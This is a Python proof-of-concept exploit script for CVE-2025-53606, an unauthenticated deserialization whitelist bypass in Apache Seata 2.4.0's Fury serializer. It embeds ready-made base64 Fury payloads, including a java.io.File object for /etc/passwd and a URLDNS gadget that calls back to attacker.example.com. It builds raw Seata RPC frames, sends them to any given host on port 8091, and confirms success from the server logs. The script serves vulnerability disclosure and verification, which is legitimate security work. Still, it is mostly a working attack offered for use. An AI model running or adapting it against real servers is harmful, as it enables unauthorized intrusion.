#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-53606 — Apache Seata Fury Deserializer Whitelist Bypass (RCE)
# Affected        : Apache Seata 2.4.0 (seata-serializer-fury)
# Patched         : Apache Seata 2.5.0
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
PoC for CVE-2025-53606: Apache Seata Fury Deserializer Whitelist Bypass

Demonstrates that the FurySerializerFactory in Apache Seata 2.4.0 fails to
enforce its class whitelist, allowing deserialization of arbitrary Java classes
via the Seata RPC v1 protocol.

ROOT CAUSE: The ClassChecker lambda returns a boolean, but Fury's ClassResolver
ignores the return value — it only stops deserialization if the checker throws
an exception. Since the lambda never throws, ALL classes pass validation.

ATTACK VECTOR: An unauthenticated attacker sends a Seata RPC v1 message to
TCP port 8091 with codec byte 0x56 (FURY), containing a Fury-serialized
payload with non-whitelisted Java classes.

PAYLOAD: Pre-generated Fury-serialized payloads embedded as base64:
  - Payload 1: java.io.File object (non-whitelisted JDK class)
  - Payload 2: LinkedHashMap with File + AtomicInteger values
  - Payload 3: HashMap<URL, String> DNS callback gadget

The payloads were generated using Apache Fury 0.8.0 with the EXACT same
configuration as the vulnerable server (Language.JAVA, refTracking=true,
CompatibleMode.COMPATIBLE, requireClassRegistration=false).

Usage:
  python3 poc.py <target_host> [target_port] [container_name]
  python3 poc.py localhost 8091 cve-2025-53606-vulnerable

Requires: Python 3.6+ (stdlib only, no external dependencies)
"""

import sys
import socket
import struct
import base64
import time
import subprocess

# ============================================================================
# Seata RPC v1 Protocol Constants
# ============================================================================
MAGIC = b'\xda\xda'              # Seata magic bytes
PROTOCOL_VERSION = b'\x01'       # Protocol v1
HEAD_LENGTH = 16                 # Base header length (no head-map)
MSG_TYPE_SYNC_REQUEST = 0x00     # Synchronous request
CODEC_FURY = 0x56                # Fury serializer (0x256 truncated to byte)
COMPRESSOR_NONE = 0x00           # No compression
DEFAULT_PORT = 8091              # Seata RPC default port
RECV_TIMEOUT = 5                 # Socket receive timeout (seconds)

# ============================================================================
# Pre-generated Fury payloads (base64-encoded)
# Generated using fury-core-0.8.0.jar with matching server configuration:
#   Fury.builder()
#       .withLanguage(Language.JAVA)
#       .requireClassRegistration(false)
#       .withRefTracking(true)
#       .withCompatibleMode(CompatibleMode.COMPATIBLE)
#       .build()
# ============================================================================
PAYLOADS = {
    "file": {
        "description": "java.io.File(\"/etc/passwd\") — non-whitelisted JDK class",
        "class": "java.io.File",
        "base64": "AjkAAAAAAQEAFQT09oaRjrG8JBUGkOAGA3th4b5Kz3IVCyBZ603OACwvZXRjL3Bhc3N3ZP7///////9/LwABEIDk2edfc38LABUkFQaQ4A4VCyA=",
    },
    "hashmap_mixed": {
        "description": "LinkedHashMap with File + AtomicInteger values",
        "class": "java.util.LinkedHashMap",
        "base64": "AmEAAAAAUAL/LBRwcm9vZgABAQAVBPT2hpGOsbwkFQaQ4AYDe2HhvkrPchULIFnrTc4AZC90bXAvY3ZlLTIwMjUtNTM2MDYtcHJvb2b+////////fy8A/ywUY2xhc3MAhAEqAAAAARCA5NnnX3N/CwAVJBUGkOAOFQsg",
    },
    "urldns": {
        "description": "HashMap<URL, String> DNS callback (URL.hashCode=-1)",
        "class": "java.net.URL",
        "base64": "Av////8ARAEABgAZBAeJeWKvF0CkFQaaSYAGAn+P2xZo2LtdXKABAAcFWejLpgA8L2N2ZS0yMDI1LTUzNjA2WbctrwBQYXR0YWNrZXIuZXhhbXBsZS5jb20ldy3PAVkpWgP9s/A3W8vrjZMAUGF0dGFja2VyLmV4YW1wbGUuY29tS6CnzKw2uQIBs7yyKd9yPQMAEGh0dHD+////////f/8sHGV4cGxvaXQ=",
    },
}


def build_seata_rpc_frame(fury_payload_bytes):
    """
    Construct a Seata RPC v1 binary frame wrapping a Fury-serialized payload.

    Wire format:
    Offset  Size  Field
    0-1     2B    Magic: 0xDADA
    2       1B    Protocol version: 0x01
    3-6     4B    Full length (int32 BE, header + body)
    7-8     2B    Head length (int16 BE, 16 = no head-map)
    9       1B    Message type: 0x00 (SYNC_REQUEST)
    10      1B    Codec type: 0x56 (FURY)
    11      1B    Compressor: 0x00 (NONE)
    12-15   4B    Request ID (int32 BE)
    16+     NB    Body: Fury-serialized payload
    """
    body = fury_payload_bytes
    full_length = HEAD_LENGTH + len(body)

    header = MAGIC
    header += PROTOCOL_VERSION
    header += struct.pack('>i', full_length)          # Full length (BE int32)
    header += struct.pack('>h', HEAD_LENGTH)           # Head length (BE int16)
    header += struct.pack('B', MSG_TYPE_SYNC_REQUEST)  # Message type
    header += struct.pack('B', CODEC_FURY)             # Codec: FURY (0x56)
    header += struct.pack('B', COMPRESSOR_NONE)        # No compression
    header += struct.pack('>i', 1)                     # Request ID

    return header + body


def send_exploit(target_host, target_port, payload_name, payload_b64):
    """
    Send a Fury-serialized payload wrapped in Seata RPC v1 frame to the target.

    Returns: (success: bool, response_hex: str, error_msg: str)
    """
    try:
        # Step 1: Decode the pre-generated Fury payload from base64
        fury_bytes = base64.b64decode(payload_b64)

        # Step 2: Wrap in Seata RPC v1 frame with FURY codec byte (0x56)
        frame = build_seata_rpc_frame(fury_bytes)

        print(f"  Sending {len(frame)} bytes (header: {HEAD_LENGTH}, body: {len(fury_bytes)})")
        print(f"  Frame header hex: {frame[:HEAD_LENGTH].hex()}")

        # Step 3: Connect to Seata RPC port and send the malicious frame
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(RECV_TIMEOUT)
        sock.connect((target_host, target_port))
        sock.sendall(frame)

        # Step 4: Try to read server response
        try:
            response = sock.recv(4096)
            print(f"  Response: {len(response)} bytes — {response[:32].hex()}...")
            return True, response.hex(), None
        except socket.timeout:
            print(f"  No response within {RECV_TIMEOUT}s (server processed silently)")
            return True, "(timeout)", None
        finally:
            sock.close()

    except ConnectionRefusedError:
        return False, None, "Connection refused"
    except socket.timeout:
        return False, None, "Connection timeout"
    except Exception as e:
        return False, None, str(e)


def check_server_logs(container_name, since_seconds=10):
    """
    Fetch recent Docker container logs.
    Returns the full log text.
    """
    try:
        result = subprocess.run(
            ["docker", "logs", "--since", f"{since_seconds}s", container_name],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"(error reading logs: {e})"


def analyze_logs(logs, payload_class):
    """
    Analyze server logs to determine if:
    - The whitelist/AllowListChecker blocked the class (patched behavior)
    - The class was deserialized despite not being whitelisted (vulnerable)
    - Fury was invoked at all (the codec byte was accepted)

    Returns: (verdict: str, evidence: list[str])
    """
    evidence = []
    lines = logs.split('\n')

    # Indicators that the class was BLOCKED by AllowListChecker (patched)
    blocked_indicators = [
        "InsecureException",
        "not allowed for serialization",
        "is not allowed",
    ]

    # Indicators that deserialization SUCCEEDED (vulnerable — whitelist bypassed)
    bypass_indicators = [
        "rpcMessage body[",         # Body was fully deserialized
        "not MessageTypeAware",     # Cast failed after deserialization succeeded
        "Deserialize failed, read objects are",  # Fury deserialized objects
        "ObjectStreamSerializer",   # Fury used JDK serialization (for URL, File)
    ]

    # Indicators that Fury was invoked at all
    fury_invoked = [
        "Created new fury",
        "FuryBuilder",
        "FuryRefCodec",
        "JaninoUtils",
        "CompileUnit",
    ]

    has_blocked = False
    has_bypass = False
    has_fury = False

    for line in lines:
        line_stripped = line.strip()
        if not line_stripped:
            continue

        for indicator in blocked_indicators:
            if indicator.lower() in line_stripped.lower():
                has_blocked = True
                evidence.append(f"[BLOCKED] {line_stripped[:150]}")

        for indicator in bypass_indicators:
            if indicator.lower() in line_stripped.lower():
                has_bypass = True
                evidence.append(f"[BYPASS] {line_stripped[:150]}")

        for indicator in fury_invoked:
            if indicator.lower() in line_stripped.lower():
                has_fury = True
                evidence.append(f"[FURY] {line_stripped[:150]}")

    # Check if attacker-controlled content appears in logs (strongest proof)
    attacker_content_markers = [
        "attacker.example.com",     # URL DNS callback domain
        "/etc/passwd",              # File path
        "cve-2025-53606",           # Payload marker
        "AtomicInteger",            # Non-whitelisted class
    ]
    for marker in attacker_content_markers:
        for line in lines:
            if marker in line:
                evidence.append(f"[CONTENT] Attacker content found: '{marker}'")
                has_bypass = True
                break

    if has_blocked:
        return "blocked", evidence
    elif has_bypass:
        return "bypass_confirmed", evidence
    elif has_fury:
        return "fury_invoked", evidence
    else:
        return "unclear", evidence


def exploit(target_host, target_port, container_name=None):
    """
    Run the full exploit against the target, testing all payload variants.
    """
    print("=" * 72)
    print("CVE-2025-53606: Apache Seata Fury Deserializer Whitelist Bypass")
    print("=" * 72)
    print(f"Target: {target_host}:{target_port}")
    if container_name:
        print(f"Container: {container_name}")
    print()

    # Verify target is reachable
    print("[*] Checking target connectivity...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        sock.close()
        print(f"[+] Port {target_port} is open\n")
    except Exception as e:
        print(f"[-] Cannot reach {target_host}:{target_port}: {e}")
        return False

    results = {}

    for name, payload_info in PAYLOADS.items():
        print(f"[*] Testing payload: {name}")
        print(f"    Description: {payload_info['description']}")
        print(f"    Target class: {payload_info['class']}")

        # Small delay between payloads for clean log separation
        time.sleep(1)

        # Send the exploit payload
        success, response, error = send_exploit(
            target_host, target_port, name, payload_info['base64']
        )

        if not success:
            print(f"  [-] FAILED: {error}")
            results[name] = {"status": "error", "error": error}
            print()
            continue

        # Wait for server to process and log
        time.sleep(2)

        # Analyze server logs if container name is provided
        if container_name:
            logs = check_server_logs(container_name, since_seconds=8)
            verdict, evidence = analyze_logs(logs, payload_info['class'])

            if evidence:
                print(f"  [*] Server log evidence:")
                seen = set()
                for e in evidence:
                    if e not in seen:
                        seen.add(e)
                        print(f"      {e}")

            if verdict == "bypass_confirmed":
                print(f"  [+] BYPASS CONFIRMED: Non-whitelisted class deserialized!")
                results[name] = {"status": "bypass_confirmed", "response": response}
            elif verdict == "blocked":
                print(f"  [!] BLOCKED: AllowListChecker rejected the class")
                results[name] = {"status": "blocked", "response": response}
            elif verdict == "fury_invoked":
                print(f"  [~] Fury was invoked (deserialization attempted)")
                results[name] = {"status": "fury_invoked", "response": response}
            else:
                print(f"  [?] UNCLEAR: No definitive log evidence")
                results[name] = {"status": "unclear", "response": response}
        else:
            results[name] = {"status": "sent", "response": response}

        print()

    # ========================================================================
    # Summary
    # ========================================================================
    print("=" * 72)
    print("RESULTS SUMMARY")
    print("=" * 72)

    bypass_count = sum(1 for r in results.values()
                       if r.get("status") in ("bypass_confirmed", "fury_invoked"))
    blocked_count = sum(1 for r in results.values()
                        if r.get("status") == "blocked")

    for name, result in results.items():
        status = result.get("status", "unknown")
        icon = {
            "bypass_confirmed": "\u2713 VULNERABLE",
            "fury_invoked":     "~ LIKELY VULNERABLE",
            "blocked":          "\u2717 BLOCKED (patched)",
            "sent":             "\u2192 SENT",
            "error":            "\u2717 ERROR",
            "unclear":          "? UNCLEAR",
        }.get(status, "? UNKNOWN")
        print(f"  [{icon}] {name}: {PAYLOADS[name]['description']}")

    print()
    if bypass_count > 0:
        print(f"[+] CVE-2025-53606 CONFIRMED: {bypass_count}/{len(PAYLOADS)} "
              f"payloads bypassed the Fury ClassChecker whitelist")
        print(f"    The server deserialized non-whitelisted Java classes without")
        print(f"    throwing InsecureException, proving the ClassChecker is ineffective.")
        return True
    elif blocked_count > 0:
        print(f"[-] Server appears PATCHED: {blocked_count}/{len(PAYLOADS)} payloads blocked")
        return False
    else:
        print("[?] Results inconclusive — check server logs manually")
        return None


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [target_port] [container_name]")
        print(f"  target_host    : IP or hostname of the Seata server")
        print(f"  target_port    : RPC port (default: {DEFAULT_PORT})")
        print(f"  container_name : Docker container name for log analysis")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} localhost")
        print(f"  {sys.argv[0]} localhost 8091 cve-2025-53606-vulnerable")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else None

    result = exploit(host, port, container)

    if result is True:
        print("\n[+] EXPLOITATION SUCCESSFUL — CVE-2025-53606 confirmed")
        sys.exit(0)
    elif result is False:
        print("\n[-] Exploitation failed or server is patched")
        sys.exit(1)
    else:
        print("\n[?] Inconclusive results")
        sys.exit(2)
